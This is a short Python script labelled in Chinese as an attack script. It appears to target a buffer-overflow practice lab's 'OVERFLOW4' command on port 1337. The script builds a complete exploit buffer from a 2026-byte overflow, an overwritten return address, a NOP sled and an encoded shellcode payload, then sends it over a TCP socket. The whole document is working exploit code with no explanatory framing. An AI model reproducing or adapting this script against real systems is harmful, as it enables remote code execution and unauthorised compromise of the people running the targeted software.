#coding=utf-8
#!/usr/bin/python

#攻击脚本

import socket

ip = "10.10.179.114"
port = 1337

prefix = "OVERFLOW4 "
offset = 2026 
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"

padding = "\x90" * 16

buf = ""
buf+="\xd9\xf6\xd9\x74\x24\xf4\xbf\x54\x4c\x29\x98\x58\x29\xc9\xb1"
buf+="\x52\x31\x78\x17\x83\xc0\x04\x03\x2c\x5f\xcb\x6d\x30\xb7\x89"
buf+="\x8e\xc8\x48\xee\x07\x2d\x79\x2e\x73\x26\x2a\x9e\xf7\x6a\xc7"
buf+="\x55\x55\x9e\x5c\x1b\x72\x91\xd5\x96\xa4\x9c\xe6\x8b\x95\xbf"
buf+="\x64\xd6\xc9\x1f\x54\x19\x1c\x5e\x91\x44\xed\x32\x4a\x02\x40"
buf+="\xa2\xff\x5e\x59\x49\xb3\x4f\xd9\xae\x04\x71\xc8\x61\x1e\x28"
buf+="\xca\x80\xf3\x40\x43\x9a\x10\x6c\x1d\x11\xe2\x1a\x9c\xf3\x3a"
buf+="\xe2\x33\x3a\xf3\x11\x4d\x7b\x34\xca\x38\x75\x46\x77\x3b\x42"
buf+="\x34\xa3\xce\x50\x9e\x20\x68\xbc\x1e\xe4\xef\x37\x2c\x41\x7b"
buf+="\x1f\x31\x54\xa8\x14\x4d\xdd\x4f\xfa\xc7\xa5\x6b\xde\x8c\x7e"
buf+="\x15\x47\x69\xd0\x2a\x97\xd2\x8d\x8e\xdc\xff\xda\xa2\xbf\x97"
buf+="\x2f\x8f\x3f\x68\x38\x98\x4c\x5a\xe7\x32\xda\xd6\x60\x9d\x1d"
buf+="\x18\x5b\x59\xb1\xe7\x64\x9a\x98\x23\x30\xca\xb2\x82\x39\x81"
buf+="\x42\x2a\xec\x06\x12\x84\x5f\xe7\xc2\x64\x30\x8f\x08\x6b\x6f"
buf+="\xaf\x33\xa1\x18\x5a\xce\x22\x2d\x8a\xd9\x68\x59\xae\xd9\x9d"
buf+="\xc6\x27\x3f\xf7\xe6\x61\xe8\x60\x9e\x2b\x62\x10\x5f\xe6\x0f"
buf+="\x12\xeb\x05\xf0\xdd\x1c\x63\xe2\x8a\xec\x3e\x58\x1c\xf2\x94"
buf+="\xf4\xc2\x61\x73\x04\x8c\x99\x2c\x53\xd9\x6c\x25\x31\xf7\xd7"
buf+="\x9f\x27\x0a\x81\xd8\xe3\xd1\x72\xe6\xea\x94\xcf\xcc\xfc\x60"
buf+="\xcf\x48\xa8\x3c\x86\x06\x06\xfb\x70\xe9\xf0\x55\x2e\xa3\x94"
buf+="\x20\x1c\x74\xe2\x2c\x49\x02\x0a\x9c\x24\x53\x35\x11\xa1\x53"
buf+="\x4e\x4f\x51\x9b\x85\xcb\x71\x7e\x0f\x26\x1a\x27\xda\x8b\x47"
buf+="\xd8\x31\xcf\x71\x5b\xb3\xb0\x85\x43\xb6\xb5\xc2\xc3\x2b\xc4"
buf+="\x5b\xa6\x4b\x7b\x5b\xe3";

payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

